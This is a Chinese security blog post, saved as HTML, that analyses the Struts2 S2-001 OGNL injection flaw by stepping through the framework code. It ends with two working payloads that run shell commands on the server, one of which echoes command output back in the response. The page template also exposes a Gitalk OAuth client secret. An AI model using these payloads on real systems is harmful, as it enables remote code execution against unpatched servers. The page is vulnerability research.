@@ -1,0 +1,409 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Struts2漏洞调试分析 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Struts2漏洞调试分析 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="S2-001
+漏洞概要
+影响版本：Struts 2.0.0 - Struts 2.0.8
+漏洞环境
+Jdk8u301、Struts 2.0.8、Tomcat 8.5.84
+漏洞分析
+Struts 2 框架的数据处理流程图：
+
+我们可以看到S..." />
+    <meta name="keywords" content="Struts2,Java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Struts2漏洞调试分析
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-12-16
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/struts2/" class="post-tag">
+                  # Struts2
+                </a>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="s2-001">S2-001</h1>
+<h2 id="漏洞概要">漏洞概要</h2>
+<p>影响版本：Struts 2.0.0 - Struts 2.0.8</p>
+<h2 id="漏洞环境">漏洞环境</h2>
+<p>Jdk8u301、Struts 2.0.8、Tomcat 8.5.84</p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>Struts 2 框架的数据处理流程图：</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/e4ed40f35effe.png" alt="1671191739643.png" loading="lazy"></figure>
+<p>我们可以看到Struts2在接收到HTTP请求的时候，会经过一系列<code>拦截器(Interceptor)</code>，这些拦截器可以是Struts2自带的，也可以是用户自定义的，这取决于<code>struts.xml</code>配置文件，而如下配置就继承了struts-default，使用了Struts2自带的拦截器。</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;!DOCTYPE struts PUBLIC
+        &quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;
+        &quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;&gt;
+&lt;struts&gt;
+    &lt;package name=&quot;S2-001&quot; extends=&quot;struts-default&quot;&gt;
+        &lt;action name=&quot;login&quot; class=&quot;com.demo.action.LoginAction&quot;&gt;
+            &lt;result name=&quot;success&quot;&gt;welcome.jsp&lt;/result&gt;
+            &lt;result name=&quot;error&quot;&gt;index.jsp&lt;/result&gt;
+        &lt;/action&gt;
+    &lt;/package&gt;
+&lt;/struts&gt;
+</code></pre>
+<p>我们可以来查看一下自带的拦截器栈<code>defaultStack</code></p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/4162a3fcd8001.png" alt="1671192187582.png" loading="lazy"></figure>
+<p>我们需要重点关注其中的<code>params</code>拦截器</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/e99da58d7f549.png" alt="1671192338501.png" loading="lazy"></figure>
+<p>这个拦截器会从客户端获取到请求的参数，并且调用<code>setParameters()</code>方法</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/4ac6926c11208.png" alt="1671192608320.png" loading="lazy"></figure>
+<p>然后该方法调用<code>stack.setValue()</code>方法，继续跟进</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/523e60b1463b1.png" alt="1671192939152.png" loading="lazy"></figure>
+<p>最后调用<code>OgnlUtil.setValue()</code>方法，将参数写入到 action 中，并存入上下文中</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/bba54dedc6b3d.png" alt="1671193044711.png" loading="lazy"></figure>
+<p>最后<code>return invocation.invoke();</code>进入下一个拦截器，执行经过了这一系列拦截器之后，会走到<code>DefaultActionInvocation.java:253</code></p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/cf3a81f54e716.png" alt="1671194252834.png" loading="lazy"></figure>
+<p>继续跟进，走到<code>DefaultActionInvocation.java:348</code>，这里调用了Result实现类的execute方法，也就是我们的业务逻辑<code>LoginAction.execute()</code></p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/ce116d29338b1.png" alt="1671194605922.png" loading="lazy"></figure>
+<p>进入到业务逻辑<code>Action</code>当中，程序会根据 <code>Action</code> 处理的结果，选择对应的 <code>JSP</code> 视图进行展示，并对视图中的 <code>Struts2</code> 标签进行处理。如下图，在本例中 <code>Action</code> 处理用户登录失败时会返回 <code>error</code>，于是会返回index.jsp，若登陆成功则跳转到<code>welcome.jsp</code></p>
+<pre><code class="language-java">package com.demo.action;
+
+import com.opensymphony.xwork2.ActionSupport;
+
+public class LoginAction extends ActionSupport {
+    private String username = null;
+    private String password = null;
+
+    public String getUsername() {
+        return this.username;
+    }
+
+    public String getPassword() {
+        return this.password;
+    }
+
+    public void setUsername(String username) {
+        this.username = username;
+    }
+
+    public void setPassword(String password) {
+        this.password = password;
+    }
+
+    public String execute() throws Exception {
+        if ((this.username.isEmpty()) || (this.password.isEmpty())) {
+            return &quot;error&quot;;
+        }
+        if ((this.username.equalsIgnoreCase(&quot;admin&quot;))
+                &amp;&amp; (this.password.equals(&quot;admin&quot;))) {
+            return &quot;success&quot;;
+        }
+        return &quot;error&quot;;
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/ea14163d0aef3.png" alt="1671193672055.png" loading="lazy"></figure>
+<p>在JSP中如果使用了Struts2标签 <code>&lt;s:textfield /&gt;</code>时,则会调用先<code>org.apache.struts2.views.jsp.ComponentTagSupport</code> 中的 <code>doStartTag()</code> ，然后调用 <code>doEndTag()</code> 方法：</p>
+<ul>
+<li><code>doStartTag()</code>：获取一些组件信息和属性赋值，做一些初始化的工作</li>
+<li><code>doEndTag()</code>：在标签解析结束后需要做的事，如调用组件的 <code>end()</code> 方法</li>
+</ul>
+<p>而这个漏洞的触发点，就从 <code>doEndTag()</code> 开始，这个方法调用组件 <code>org.apache.struts2.components.UIBean</code> 的<code>end()</code> 方法</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/8d4840fe8f8af.png" alt="1671194962602.png" loading="lazy"></figure>
+<p>随后调用 <code>evaluateParams()</code> 方法，这个方法判断了<code>altSyntax</code>是否开启，并调用 <code>findValue()</code> 方法寻找参数值：</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/db03771c7b4e1.png" alt="1671186318268.png" loading="lazy"></figure>
+<p>跟进<code>findValue()</code>方法，这里调用了<code>translateVariables()</code>方法</p>
+<pre><code class="language-java">protected Object findValue(String expr, Class toType) {
+    if (this.altSyntax() &amp;&amp; toType == String.class) {
+        return TextParseUtil.translateVariables('%', expr, this.stack);
+    } else {
+        if (this.altSyntax() &amp;&amp; expr.startsWith(&quot;%{&quot;) &amp;&amp; expr.endsWith(&quot;}&quot;)) {
+            expr = expr.substring(2, expr.length() - 1);
+        }
+
+        return this.getStack().findValue(expr, toType);
+    }
+}
+</code></pre>
+<p>跟进<code>translateVariables()</code>方法，发现他又调用了重载方法</p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/45582d97ac948.png" alt="1671195246565.png" loading="lazy"></figure>
+<p>继续跟进</p>
+<pre><code class="language-java">public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator) {
+    Object result = expression;
+    while (true) {
+        int start = expression.indexOf(open + &quot;{&quot;);
+        int length = expression.length();
+        int x = start + 2;
+        int end;
+        char c;
+        int count = 1;
+        while (start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) {
+            c = expression.charAt(x++);
+            if (c == '{') {
+                count++;
+            } else if (c == '}') {
+                count--;
+            }
+        }
+        end = x - 1;
+        if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0)) {
+            String var = expression.substring(start + 2, end);
+            Object o = stack.findValue(var, asType);
+            if (evaluator != null) {
+               o = evaluator.evaluate(o);
+            }
+            String left = expression.substring(0, start);
+            String right = expression.substring(end + 1);
+            if (o != null) {
+                if (TextUtils.stringSet(left)) {
+                    result = left + o;
+                } else {
+                    result = o;
+                }
+                if (TextUtils.stringSet(right)) {
+                    result = result + right;
+                }
+                expression = left + o + right;
+            } else {
+                result = left + right;
+                expression = left + right;
+            }
+        } else {
+            break;
+        }
+    }
+    return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);
+}
+</code></pre>
+<p>然后在这里又调用了<code>findValue()</code></p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/3de7ac34111bf.png" alt="1671195791605.png" loading="lazy"></figure>
+<p>然后调用<code>OgnlUyil.getValue()</code>进行了Ognl表达式解析</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/556b1dc2f68f6.png" alt="1671195856130.png" loading="lazy"></figure>
+<p>那么如何触发漏洞呢？答案就在我们传入<code>translateVariables()</code>方法的表达式 <code>expression</code>为 <code>%{username}</code> ，经过 <code>Ognl</code>表达式解析，程序会获得其值为<code>%{1+1}</code> ，这个值是之前<code>params</code>拦截器的时候获取到的。由于此处使用的是<code>while</code>循环来解析<code>Ognl</code>，所以获得的 <code>%{1+1}</code>又会被再次执行，最终也就造成了任意代码执行。</p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/5fe1526d3628c.png" alt="1671197572046.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/17/f4c7ef69d19cd.png" alt="1671253676667.png" loading="lazy"></figure>
+<h2 id="payload">payload</h2>
+<pre><code class="language-shell">%{(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;open -a Calculator&quot;})).start()}
+</code></pre>
+<pre><code class="language-bash">%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;whoami&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+</code></pre>
+<h2 id="总结">总结</h2>
+<p>漏洞造成原因在于:</p>
+<ul>
+<li>Struts 2 框架中的一个标签处理功能： altSyntax。在开启时，支持对标签中的 OGNL 表达式进行解析并执行。</li>
+<li>在<code>translateVariables()</code>中，递归解析了表达式，在处理完<code>%{username}</code>后将<code>username</code>的值直接取出并继续在<code>while</code>循环中解析，若用户输入的<code>username</code>是恶意的<code>ognl</code>表达式，比如<code>%{1+1}</code>，则得以解析执行。</li>
+</ul>
+<h2 id="参考">参考</h2>
+<p>https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/</p>
+<p>https://mochazz.github.io/2020/06/16/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BStruts2-001/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</p>
+<p>https://github.com/Y4tacker/JavaSec/blob/main/7.Struts2%E4%B8%93%E5%8C%BA/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Struts2-001.md</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#s2-001">S2-001</a>
+<ul>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81">漏洞概要</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83">漏洞环境</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+<li><a href="#payload">payload</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/Tabby/">
+              <h3 class="post-title">
+                Tabby食用指北
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
